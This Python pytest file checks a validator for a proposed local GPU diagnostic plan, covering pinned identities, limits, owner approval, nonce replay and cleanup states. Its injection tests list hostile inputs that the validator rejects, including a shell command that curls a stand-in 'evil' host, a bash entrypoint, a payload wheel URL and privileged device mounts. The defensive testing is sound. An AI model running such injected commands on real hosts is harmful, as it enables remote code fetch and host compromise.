"""Device-free controls for the PROPOSED local GPU diagnostic plan.

No accelerator is initialized, no numerical backend is imported, no Docker
command runs, and no real host grant or quarantine storage is touched. Every
identity below is a synthetic fixture value.
"""

import hashlib
import json

import pytest

from carbon.development_session.local_diagnostic_plan import (
    EXCLUSIVITY,
    FORBIDDEN_FIELDS,
    MAX_PROCESS_WALL_SECONDS,
    MAX_TASK_WALL_SECONDS,
    MAX_TRAINING_STEPS,
    REQUIRED_FIELDS,
    SCHEMA,
    STATUS,
    LocalDiagnosticRefused,
    OwnerApproval,
    PinnedIdentities,
    check_owner_approval,
    check_previous_cleanup,
    require_local_diagnostic_dispatch,
    validate_plan,
)


def _sha(seed):
    return "sha256:" + hashlib.sha256(seed.encode("ascii")).hexdigest()


COMMIT = "0" * 40
NONCE = "a" * 32


def _pinned(**overrides):
    values = {
        "source_commit": COMMIT,
        "source_tree_digest": _sha("tree"),
        "image_id": _sha("image"),
        "environment_lock_digest": _sha("lock"),
        "profile_digest": _sha("profile"),
        "input_phase": "research-train",
        "input_digest": _sha("input"),
    }
    values.update(overrides)
    return PinnedIdentities(**values)


def _document(pinned, **overrides):
    document = {
        "schema": SCHEMA,
        "operation": "registered_trainer_fit",
        "source_commit": pinned.source_commit,
        "source_tree_digest": pinned.source_tree_digest,
        "image_id": pinned.image_id,
        "environment_lock_digest": pinned.environment_lock_digest,
        "profile_digest": pinned.profile_digest,
        "input_phase": pinned.input_phase,
        "input_digest": pinned.input_digest,
        "training_steps": 32,
        "invocations": 1,
        "retries": 0,
        "process_wall_seconds": 600,
        "task_wall_seconds": 1800,
        "max_output_bytes": 1024,
        "nonce": NONCE,
    }
    document.update(overrides)
    return document


# --- the plan is a proposal, never an execution -------------------------------


def test_dispatch_is_refused_unconditionally():
    """Merging preparation cannot start work."""
    with pytest.raises(LocalDiagnosticRefused, match="dispatch_disabled"):
        require_local_diagnostic_dispatch(None)
    pinned = _pinned()
    plan = validate_plan(_document(pinned), pinned=pinned)
    with pytest.raises(LocalDiagnosticRefused, match="dispatch_disabled"):
        require_local_diagnostic_dispatch(plan)


def test_validated_plan_is_marked_proposed_and_never_official():
    pinned = _pinned()
    plan = validate_plan(_document(pinned), pinned=pinned)
    assert plan.status == STATUS == "PROPOSED_NOT_ACTIVATED"
    assert plan.official_eligible is False
    assert plan.exclusivity == EXCLUSIVITY
    document = plan.document()
    assert document["official_eligible"] is False
    assert document["score"] is None
    assert document["hardware_acceptance"] == "NOT_EXECUTED"
    assert document["exclusivity"] == "UNESTABLISHED_DEVELOPMENT_OBSERVATION"
    assert document["device_memory_cap"] == "NOT_ENFORCED_BY_THIS_PLAN"


def test_plan_claims_no_exclusivity_and_no_memory_enforcement():
    """A development observation must not assert whole-device properties."""
    pinned = _pinned()
    document = validate_plan(_document(pinned), pinned=pinned).document()
    serialized = json.dumps(document)
    assert "EXCLUSIVE" not in serialized.upper().replace(
        "UNESTABLISHED_DEVELOPMENT_OBSERVATION", ""
    )


def test_preparation_dispatches_no_gpu_task(monkeypatch):
    """Validation must not import a numerical backend or shell out."""
    import subprocess
    import sys

    def refuse(*args, **kwargs):  # pragma: no cover - must never run
        raise AssertionError("preparation attempted to execute a command")

    monkeypatch.setattr(subprocess, "run", refuse)
    monkeypatch.setattr(subprocess, "Popen", refuse)
    # Another suite in the same session may already have imported jax, so the
    # property under test is that this path imports nothing new, not that the
    # interpreter is globally free of it.
    before = "jax" in sys.modules
    pinned = _pinned()
    validate_plan(_document(pinned), pinned=pinned)
    assert ("jax" in sys.modules) is before


# --- identity binding ---------------------------------------------------------


@pytest.mark.parametrize(
    "field",
    [
        "source_commit",
        "source_tree_digest",
        "image_id",
        "environment_lock_digest",
        "profile_digest",
        "input_digest",
    ],
)
def test_wrong_pinned_identity_is_refused(field):
    pinned = _pinned()
    wrong = COMMIT[:-1] + "1" if field == "source_commit" else _sha("other")
    with pytest.raises(LocalDiagnosticRefused, match="pinned identity"):
        validate_plan(_document(pinned, **{field: wrong}), pinned=pinned)


def test_unknown_workload_is_refused():
    pinned = _pinned()
    with pytest.raises(LocalDiagnosticRefused, match="unregistered diagnostic"):
        validate_plan(_document(pinned, operation="fit_chunks_sweep"), pinned=pinned)


def test_unregistered_schema_is_refused():
    pinned = _pinned()
    with pytest.raises(LocalDiagnosticRefused, match="unregistered plan schema"):
        validate_plan(
            _document(pinned, schema="carbon.something-else.v1"), pinned=pinned
        )


# --- untrusted input: injection and protected data ----------------------------


@pytest.mark.parametrize(
    "field,value",
    [
        ("command", ["/bin/sh", "-c", "curl http://evil"]),
        ("entrypoint", "/bin/bash"),
        ("mounts", ["/var/lib/carbon:/grant"]),
        ("devices", ["/dev/dxg"]),
        ("device_requests", [{"Driver": "nvidia"}]),
        ("gpus", "all"),
        ("privileged", True),
        ("url", "https://example.invalid/payload.whl"),
        ("packages", ["evil-package"]),
        ("env", {"XLA_FLAGS": "--x"}),
        ("role", "VALIDATOR_RECONSTRUCTION"),
        ("grant_digest", _sha("fake-grant")),
        ("host_root", "/var/lib/carbon/accelerators"),
        ("official_eligible", True),
        ("score", 0.99),
        ("tolerance", 1e-3),
    ],
)
def test_caller_supplied_execution_control_is_refused(field, value):
    """Injected control is rejected outright, never sanitized."""
    pinned = _pinned()
    with pytest.raises(LocalDiagnosticRefused, match="caller-supplied execution"):
        validate_plan(_document(pinned, **{field: value}), pinned=pinned)


@pytest.mark.parametrize(
    "phase", ["exam", "final", "evaluation", "customer", "protected", "live", "EXAM"]
)
def test_protected_input_phase_is_refused(phase):
    with pytest.raises(LocalDiagnosticRefused, match="protected input phase"):
        _pinned(input_phase=phase)


def test_forbidden_and_required_fields_never_overlap():
    """An echoed pinned identity must not be mistaken for injected control."""
    assert FORBIDDEN_FIELDS.isdisjoint(REQUIRED_FIELDS)


def test_unexpected_extra_field_is_refused():
    pinned = _pinned()
    with pytest.raises(LocalDiagnosticRefused, match="exact plan field set"):
        validate_plan(_document(pinned, note="harmless"), pinned=pinned)


def test_missing_required_field_is_refused():
    pinned = _pinned()
    document = _document(pinned)
    del document["training_steps"]
    with pytest.raises(LocalDiagnosticRefused, match="exact plan field set"):
        validate_plan(document, pinned=pinned)


# --- bounds and deadlines -----------------------------------------------------


@pytest.mark.parametrize(
    "field,value",
    [
        ("training_steps", MAX_TRAINING_STEPS + 1),
        ("training_steps", 0),
        ("invocations", 2),
        ("retries", 1),
        ("process_wall_seconds", MAX_PROCESS_WALL_SECONDS + 1),
        ("task_wall_seconds", MAX_TASK_WALL_SECONDS + 1),
        ("max_output_bytes", 0),
    ],
)
def test_out_of_bound_values_are_refused(field, value):
    pinned = _pinned()
    with pytest.raises(LocalDiagnosticRefused):
        validate_plan(_document(pinned, **{field: value}), pinned=pinned)


@pytest.mark.parametrize("value", [True, 32.0, "32", None])
def test_non_integer_bounds_are_refused(value):
    pinned = _pinned()
    with pytest.raises(LocalDiagnosticRefused, match="exact integer"):
        validate_plan(_document(pinned, training_steps=value), pinned=pinned)


def test_process_deadline_cannot_exceed_task_deadline():
    pinned = _pinned()
    with pytest.raises(LocalDiagnosticRefused, match="whole-task deadline"):
        validate_plan(
            _document(pinned, process_wall_seconds=600, task_wall_seconds=120),
            pinned=pinned,
        )


def test_no_unlimited_retry_default():
    pinned = _pinned()
    plan = validate_plan(_document(pinned), pinned=pinned)
    assert plan.retries == 0
    assert plan.invocations == 1


# --- owner approval -----------------------------------------------------------


def _approval(plan_digest, **overrides):
    values = {"plan_digest": plan_digest, "expires_unix": 2000.0, "nonce": NONCE}
    values.update(overrides)
    return OwnerApproval(**values)


def test_valid_unexpired_approval_is_accepted():
    pinned = _pinned()
    plan = validate_plan(_document(pinned), pinned=pinned)
    digest = _sha("plan")
    check_owner_approval(plan, _approval(digest), plan_digest=digest, now=1000.0)


def test_missing_approval_is_refused():
    pinned = _pinned()
    plan = validate_plan(_document(pinned), pinned=pinned)
    with pytest.raises(LocalDiagnosticRefused, match="approval is missing"):
        check_owner_approval(plan, None, plan_digest=_sha("plan"), now=1000.0)


def test_expired_approval_is_refused():
    pinned = _pinned()
    plan = validate_plan(_document(pinned), pinned=pinned)
    digest = _sha("plan")
    with pytest.raises(LocalDiagnosticRefused, match="expired"):
        check_owner_approval(plan, _approval(digest), plan_digest=digest, now=2000.0)


def test_approval_for_a_different_plan_is_refused():
    pinned = _pinned()
    plan = validate_plan(_document(pinned), pinned=pinned)
    with pytest.raises(LocalDiagnosticRefused, match="does not bind this plan"):
        check_owner_approval(
            plan, _approval(_sha("other-plan")), plan_digest=_sha("plan"), now=1000.0
        )


def test_approval_with_a_different_nonce_is_refused():
    pinned = _pinned()
    plan = validate_plan(_document(pinned), pinned=pinned)
    digest = _sha("plan")
    with pytest.raises(LocalDiagnosticRefused, match="nonce does not bind"):
        check_owner_approval(
            plan, _approval(digest, nonce="b" * 32), plan_digest=digest, now=1000.0
        )


def test_replayed_nonce_is_refused():
    """A duplicate run cannot be admitted by reusing an approval."""
    pinned = _pinned()
    plan = validate_plan(_document(pinned), pinned=pinned)
    digest = _sha("plan")
    with pytest.raises(LocalDiagnosticRefused, match="replayed run nonce"):
        check_owner_approval(
            plan,
            _approval(digest),
            plan_digest=digest,
            now=1000.0,
            consumed_nonces=frozenset({NONCE}),
        )


@pytest.mark.parametrize(
    "bad",
    [
        {"plan_digest": "not-a-digest"},
        {"nonce": "short"},
        {"expires_unix": float("nan")},
        {"expires_unix": "soon"},
    ],
)
def test_malformed_approval_is_refused(bad):
    values = {"plan_digest": _sha("plan"), "expires_unix": 2000.0, "nonce": NONCE}
    values.update(bad)
    with pytest.raises(LocalDiagnosticRefused):
        OwnerApproval(**values)


def test_self_issued_approval_shape_is_refused():
    pinned = _pinned()
    plan = validate_plan(_document(pinned), pinned=pinned)
    digest = _sha("plan")
    fake = {"plan_digest": digest, "expires_unix": 9e9, "nonce": NONCE}
    with pytest.raises(LocalDiagnosticRefused, match="exact owner approval record"):
        check_owner_approval(plan, fake, plan_digest=digest, now=1000.0)


# --- cleanup semantics --------------------------------------------------------


@pytest.mark.parametrize("outcome", ["CLEAN", "NONE"])
def test_reconciled_previous_cleanup_allows_the_next_plan(outcome):
    check_previous_cleanup(outcome)


@pytest.mark.parametrize(
    "outcome", ["UNRECONCILED", "UNKNOWN", "FAILED", "", None, "QUARANTINED"]
)
def test_ambiguous_previous_cleanup_blocks_the_next_plan(outcome):
    """Blocks; it never clears or reuses strict quarantine."""
    with pytest.raises(LocalDiagnosticRefused, match="unreconciled"):
        check_previous_cleanup(outcome)


def test_cleanup_check_never_reports_a_released_device():
    with pytest.raises(LocalDiagnosticRefused) as error:
        check_previous_cleanup("UNKNOWN")
    assert "released" not in str(error.value).lower().replace("is required", "")


# --- no promotion into strict acceptance --------------------------------------


def test_diagnostic_evidence_cannot_claim_strict_acceptance():
    pinned = _pinned()
    document = validate_plan(_document(pinned), pinned=pinned).document()
    assert document["hardware_acceptance"] == "NOT_EXECUTED"
    assert document["official_eligible"] is False
    assert "grant_digest" not in document
    assert "role" not in document


def test_strict_registry_remains_empty_and_untouched():
    """This preparation must not establish any observation source."""
    from carbon.reconstruction.worker import accelerator_runtime

    assert accelerator_runtime.ESTABLISHED_OBSERVATION_CONTRACTS == frozenset()


def test_strict_admission_helper_is_unchanged():
    from carbon.reconstruction.accelerators import (
        GPU_PROFILE,
        AcceleratorRole,
        AcceleratorUnavailable,
        require_accelerator_admission,
    )

    with pytest.raises(AcceleratorUnavailable, match="dispatch_disabled"):
        require_accelerator_admission(GPU_PROFILE, AcceleratorRole.MINER_RESEARCH)
